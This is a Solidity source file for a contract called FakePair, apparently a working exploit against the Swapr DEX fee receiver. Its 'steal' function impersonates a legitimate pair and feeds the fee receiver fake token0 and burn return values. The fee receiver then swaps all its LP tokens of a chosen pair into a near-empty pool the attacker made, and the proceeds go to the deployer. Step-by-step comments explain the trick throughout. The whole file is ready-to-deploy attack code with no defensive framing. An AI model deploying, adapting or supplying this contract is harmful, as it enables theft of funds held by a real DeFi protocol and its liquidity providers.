pragma solidity 0.8.16;

import {ERC20} from "solmate/tokens/ERC20.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {SafeTransferLib} from "solmate/utils/SafeTransferLib.sol";

interface IDXswapPair {
    function mint(address _to) external returns (uint256 _liquidity);

    function burn(address _to)
        external
        returns (uint256 _amount0, uint256 _amount1);
}

interface IDXswapFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IDXswapRouter {
    function WETH() external pure returns (address payable);
}

interface IDXswapFeeReceiver {
    function takeProtocolFee(address[] calldata _pairs) external;
}

// SPDX-License-Identifier: GPL-3.0-or-later
contract FakePair {
    using SafeTransferLib for ERC20;

    error InvalidAmount();
    error ZeroAddress();
    error Forbidden();
    error NoProfit();

    address internal owner;

    // required to return fake data to the fee receiver
    address public token0;
    address public token1;
    mapping(address => uint256) public balanceOf;

    constructor() {
        owner = msg.sender;
    }

    /// @dev This function is able to take all of a specific kind of LP tokens
    /// from the fee receiver depending on the input paramters. This only works
    /// for pairs with one of the 2 tokens being the native currency of the targeted
    /// chain. Only the contract's deployer can be the caller.
    /// @param _token The "other token" in the pair the LP token of which
    /// we want to steal from the fee receiver. For example, if the token
    /// passed here is ETH, and the hack is performed on Gnosis Chain, all
    /// the ETH/WXDAI LP tokens will be taken from the fee receiver. If the
    /// token is GNO, the target LP tokens to steal will be GNO/WXDAI.
    /// @param _tokenAmount The amount of _token to be used to perform the hack.
    /// The value should be determined by looking at the pair the LP tokens of
    /// which the hacker wants to steal from the fee receiver contract. Liquidity
    /// will be given to this pair, and a good amount to be specified is represented
    /// by the lowest amount possible that won't result in insufficient liquidity
    /// errors in subsequent steps.
    /// @param _factory The Swapr's factory address in the target chain.
    /// @param _router The Swapr's router address in the target chain.
    /// @param _feeReceiver The Swapr's fee receiver address in the target chain.
    function steal(
        address _token,
        uint256 _tokenAmount,
        address _factory,
        address _router,
        address _feeReceiver
    ) external payable {
        // sanity checks
        address _owner = owner; // SLOAD gas optimization
        if (msg.sender != _owner) revert Forbidden();
        if (
            _token == address(0) ||
            _router == address(0) ||
            _factory == address(0) ||
            _feeReceiver == address(0)
        ) revert ZeroAddress();
        uint256 _halfValue = msg.value / 2;
        if (_tokenAmount == 0 || _halfValue == 0) revert InvalidAmount();

        // wrap the native currency for it to be usable
        address payable _weth = IDXswapRouter(_router).WETH();
        WETH(_weth).deposit{value: msg.value}();

        // 1. determine the address of the legit pair we're "impersonating" to steal its lp tokens
        // from the fee receiver (always the passed in token and the native currency wrapper of the chain).
        address _truePair = pairFor(_factory, _token, _weth);

        // 3. In order to fool the fee receiver the fake pair's token 0 and token 1
        // can be whatever as long as one of the two (in this case token0) is the
        // legit LP token we want to steal.
        token0 = _truePair;

        // 4. provide very little liquidity to the legit pair
        uint256 _truePairLiquidity = provideLiquidityUnsafe(
            _truePair,
            _token,
            _weth,
            msg.sender,
            address(this),
            _tokenAmount,
            _halfValue
        );

        // 5. create a pair with the legit lp token obtained in step 4 and the chain's
        // native currency, and provide very little liquidity.
        address _temporaryPair = IDXswapFactory(_factory).createPair(
            _truePair,
            _weth
        );
        uint256 _temporaryPairLiquidity = provideLiquidityUnsafe(
            _temporaryPair,
            _weth,
            _truePair,
            address(this),
            address(this),
            _halfValue,
            _truePairLiquidity
        );

        // 6. call take protocol fee with this contract as the collected address. Calls that
        // the fee receiver does on this contract are mocked using public storage variables
        // and transfer/burn functions implemented at the end of the contract.
        address[] memory _pairs = new address[](1);
        _pairs[0] = address(this);
        IDXswapFeeReceiver(_feeReceiver).takeProtocolFee(_pairs);

        // at this point, the following steps have happened in the call above:
        // - token0 and token1 are read from this contract. token0 is returned
        //   as the lp token we want to steal, while token1 is the zero address
        //   (no checks performed so we don't care).
        // - transfer is called on this contract by the fee receiver to send the
        //   fake lp tokens the fee receiver supposedly owns (no check on this)
        //   to the fake pair (this contract) to burn them and get back the
        //   non-existing underlying assets. This de facto doesn't happen. The
        //   balance of the fake LP tokens is zero for the fee receiver (the
        //   balanceOf mapping above never gets written), and the transfer
        //   function is mocked to simply return true and do nothing else.
        // - The burn function gets called by the fee receiver on this contract.
        //   The trick here is to fetch the fee receiver's balance of the LP token
        //   we want to steal and return it as the token0Amount from the burn
        //   function's implementation below. If you remember, we previously returned
        //   the token0 to be the LP token we want to steal in the first of these steps,
        //   so now we have a match here. Since the pair's address where to perform
        //   the LP token/native currency swap is calculated using the proper formula,
        //   all the subsequent actions will be performed on the very illiquid pair
        //   we've created on step 5 with no checks on price impact and such. The end
        //   result is that the fee receiver will dump all of its LP tokens we want to
        //   steal on the pair we've created on step 5, but since it has very little
        //   liquidity, it gets near zero in exchange. We effectively stole the LP
        //   tokens as we wanted to.

        // pull all liquidity from the temporary pair we created on step 5
        (
            uint256 _temporaryAmount0Back,
            uint256 _temporaryAmount1Back
        ) = removeLiquidityUnsafe(_temporaryPair, _temporaryPairLiquidity);

        // check if we had a net gain in legit LP tokens in the temporary pair (revert otherwise)
        if (
            (
                _truePair < _weth
                    ? _temporaryAmount0Back
                    : _temporaryAmount1Back
            ) -
                _truePairLiquidity <=
            0
        ) revert NoProfit();

        // recover liquidity from the legit pair we gave in step 4.
        removeLiquidityUnsafe(_truePair, _truePairLiquidity);

        // send everything back to the owner. The function can be used again with another
        // token X to steal all the X/WXDAI LP tokens in the fee receiver.
        collect(_token, _weth, _truePair, _owner);
    }

    /// @dev Calculates the correct address of a Swapr pair given token A and B (non ordered).
    /// @param _factory The Swapr factory address on the target chain.
    /// @param _tokenA One of the tokens in the pair.
    /// @param _tokenB The other token in the pair.
    /// @return The pair's address.
    function pairFor(
        address _factory,
        address _tokenA,
        address _tokenB
    ) internal pure returns (address) {
        (address _token0, address _token1) = _tokenA < _tokenB
            ? (_tokenA, _tokenB)
            : (_tokenB, _tokenA);
        return
            address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(
                                hex"ff",
                                _factory,
                                keccak256(abi.encodePacked(_token0, _token1)),
                                hex"d306a548755b9295ee49cc729e13ca4a45e00199bbd890fa146da43a50571776"
                            )
                        )
                    )
                )
            );
    }

    /// @dev Provides liquidity to a given pair WITHOUT PERFORMING ANY SAFETY CHECK.
    /// @param _pair The pair to provide liquidity to.
    /// @param _tokenA One of the tokens in the pair.
    /// @param _tokenB The other token in the pair.
    /// @param _fromA Where the token A given as liquidity to the pair are to be sourced from.
    /// @param _fromB Where the token B given as liquidity to the pair are to be sourced from.
    /// @param _tokenAmountA How much of token A to provide as liquidity.
    /// @param _tokenAmountB How much of token B to provide as liquidity.
    /// @return The amount of LP tokens minted.
    function provideLiquidityUnsafe(
        address _pair,
        address _tokenA,
        address _tokenB,
        address _fromA,
        address _fromB,
        uint256 _tokenAmountA,
        uint256 _tokenAmountB
    ) internal returns (uint256) {
        if (_fromA == address(this))
            ERC20(_tokenA).safeTransfer(_pair, _tokenAmountA);
        else ERC20(_tokenA).safeTransferFrom(_fromA, _pair, _tokenAmountA);

        if (_fromB == address(this))
            ERC20(_tokenB).safeTransfer(_pair, _tokenAmountB);
        else ERC20(_tokenB).safeTransferFrom(_fromB, _pair, _tokenAmountB);

        return IDXswapPair(_pair).mint(address(this));
    }

    /// @dev Removes some of the contract's liquidity from a given pair 
    /// WITHOUT PERFORMING ANY SAFETY CHECK.
    /// @param _pair The pair to remove liquidity from.
    /// @param _amount How much liquidity to remove.
    /// @return The amount of tokens returned to the contract.
    function removeLiquidityUnsafe(address _pair, uint256 _amount)
        internal
        returns (uint256, uint256)
    {
        ERC20(_pair).safeTransfer(_pair, _amount);
        return IDXswapPair(_pair).burn(address(this));
    }

    /// @dev Sends the full balance the contract has in the given 2 tokens 
    /// to a recipient address.
    /// @param _tokenA First token to be sent.
    /// @param _tokenB Second token to be sent.
    /// @param _to Who will receive the tokens.
    function collect(
        address _tokenA,
        address _tokenB,
        address _stolenToken,
        address _to
    ) internal {
        ERC20(_tokenA).safeTransfer(
            _to,
            ERC20(_tokenA).balanceOf(address(this))
        );
        ERC20(_tokenB).safeTransfer(
            _to,
            ERC20(_tokenB).balanceOf(address(this))
        );
        ERC20(_stolenToken).safeTransfer(
            _to,
            ERC20(_stolenToken).balanceOf(address(this))
        );
    }

    /// @dev Mocked function to fool the fee receiver.
    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }

    /// @dev Mocked function to fool the fee receiver.
    function burn(address)
        external
        view
        returns (uint256 _amount0, uint256 _amount1)
    {
        return (ERC20(token0).balanceOf(msg.sender), 0); // token0 is the lp token we want to steal
    }
}
